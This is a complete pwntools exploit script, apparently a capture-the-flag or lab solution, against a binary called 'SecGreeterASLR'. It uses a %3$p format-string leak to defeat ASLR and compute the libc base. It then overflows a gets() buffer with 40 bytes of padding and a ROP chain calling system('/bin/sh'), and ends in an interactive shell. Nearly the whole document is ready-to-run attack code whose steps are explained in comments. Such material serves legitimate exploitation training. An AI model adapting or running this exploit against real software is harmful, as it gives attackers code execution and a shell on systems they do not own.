from pwn import *

# --- CONFIGURATION ---
# The offset we just calculated: (Leak - Base)
offset_leak = 0x1148f7

# Set up the binary
# We use the provided binary to get symbols and architecture info
context.binary = binary = ELF('./SecGreeterASLR')
context.arch = 'amd64'

# Start the process
p = process()

# --- STAGE 1: INFO LEAK ---
# Wait for the prompt
p.recvuntil(b"What is your name?\n")

# Send the format string to leak the address
print("[*] Sending format string...")
p.sendline(b"%3$p")

# Receive the response
p.recvuntil(b"Hello ")
leak_str = p.recvuntil(b" ", drop=True).decode()
leak_addr = int(leak_str, 16)
print(f"[*] Leaked Address: {hex(leak_addr)}")

# Calculate the actual Base Address of Libc
libc_base = leak_addr - offset_leak
print(f"[*] Libc Base: {hex(libc_base)}")

# Tell pwntools where libc is located
libc = binary.libc
libc.address = libc_base

# --- STAGE 2: EXPLOIT (ROP CHAIN) ---
# We need to call system("/bin/sh")
# In 64-bit, arguments go into registers (RDI), not the stack.
rop = ROP(libc)

# Add a 'ret' instruction for stack alignment (fixes "movaps" crash in Ubuntu)
rop.call(rop.ret)

# Pop the address of "/bin/sh" into the RDI register
binsh_addr = next(libc.search(b"/bin/sh\x00"))
rop.system(binsh_addr)

# Construct the payload
# Padding: 32 bytes (buf) + 8 bytes (Saved RBP) = 40 bytes
padding = b"A" * 40
payload = padding + rop.chain()

print("[*] Sending payload...")
# Send the payload to the SECOND gets() call
p.sendline(payload)

# --- INTERACTIVE SHELL ---
print("[*] Attack launched! Switching to interactive mode...")
p.interactive()